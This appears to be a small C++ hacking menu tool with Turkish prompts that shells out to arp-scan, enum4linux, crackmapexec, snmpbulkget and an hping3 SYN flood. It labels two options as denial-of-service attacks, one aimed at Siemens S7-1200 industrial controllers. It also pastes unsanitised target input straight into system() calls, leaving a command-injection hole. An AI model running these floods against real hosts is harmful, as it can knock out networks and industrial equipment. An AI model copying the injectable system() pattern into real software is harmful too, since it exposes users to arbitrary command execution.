#include <iostream>
#include <stdlib.h>
#include <string.h>

using namespace std;

void islem(int);
void program();
void cikisKontrol(int);
void enumIslem();
void smbIslem();
void snmpIslem();
void dosIslem();

int main(){
	
	program();
	
	return 0;
}

void program(){
	
	cout<<"Opsiyon 1 : Arp Taraması"<< endl;
	cout<<"Opsiyon 2 : SMB Paylaşımları"<< endl;
	cout<<"Opsiyon 3 : SMB üzerinden İşletim Sistemi Kontrolleri"<< endl;
	cout<<"Opsiyon 4 : SNMP Bulk DOS Saldırısı"<< endl;
	cout<<"Opsiyon 5 : Siemens S7-1200 DoS Saldırısı"<< endl;
	cout<<"Seçiminizi girin (1-4):  ";
	int secim;
	cin>>secim;
	islem(secim);
	cout<<"Devam Etmek İçin 1, Programı Sonlandırmak İçin 0:  ";
	int ikinciSecim;
	cin>>ikinciSecim;
	cikisKontrol(ikinciSecim);
	
}

void cikisKontrol( int a){
	switch(a){
		case 0:
			cout<<"Program Sonlandı...";
			break;
		case 1:
			program();
			break;
		default:
			cout<<"Hatalı Giriş Yaptınız! - Devam Etmek İçin 1, Programı Sonlandırmak İçin 0"<<endl;
			cin>>a;
			cikisKontrol(a);
	}
}

void islem (int a){
	
	switch(a){
		case 1:
			//Arp Taraması
			system("sudo arp-scan -l");
			break;
		case 2:
			//SMB Paylaşımları
			enumIslem();
			break;
		case 3:
			//SMB üzerinden İşletim Sistemi Kontrolleri
			smbIslem();
			break;
		case 4:
			//SNMP Bulk DOS Saldırısı
			snmpIslem();
			break;
		case 5:
			//Siemens S7-1200 DoS Saldırısı
			dosIslem();
			break;
		default:
			cout<<"Hatalı Giriş Yaptınız! - ";
			program();
	}
	
}

void enumIslem(){
	
	string enumHedefIP;
	cout<<"Hedef IP'yi girin:  ";
	cin>>enumHedefIP;
	string komutEnum4Linux_S = "enum4linux " + enumHedefIP;
	int enumSayi = komutEnum4Linux_S.length();
	char komutEnum4Linux_C[enumSayi + 1];
	strcpy(komutEnum4Linux_C, komutEnum4Linux_S.c_str());
	system(komutEnum4Linux_C);
	
}

void smbIslem(){
	
	string smbHedefIP;
	cout<<"Hedef IP'yi girin:  ";
	cin>>smbHedefIP;
	string komutSmb_S = "xterm -hold -e crackmapexec smb " + smbHedefIP;
	int smbSayi = komutSmb_S.length();
	char komutSmb_C[smbSayi + 1];
	strcpy(komutSmb_C, komutSmb_S.c_str());
	system(komutSmb_C);
	
}

void snmpIslem(){
	
	string snmpHedefIP;
	cout<<"Hedef IP'yi girin:  ";
	cin>>snmpHedefIP;
	string komutSnmp_S = "snmpbulkget -v2c -0s -c public " + snmpHedefIP + " 100";
	int snmpSayi = komutSnmp_S.length();
	char komutSnmp_C[snmpSayi + 1];
	strcpy(komutSnmp_C, komutSnmp_S.c_str());
	system(komutSnmp_C);
	
}

void dosIslem(){
	
	string dosHedefIP;
	cout<<"Hedef IP'yi girin:  ";
	cin>>dosHedefIP;
	string komutDos_S = "hping3 --flood -S -p 443 " + dosHedefIP;
	int dosSayi = komutDos_S.length();
	char komutDos_C[dosSayi + 1];
	strcpy(komutDos_C, komutDos_S.c_str());
	system(komutDos_C);
	
}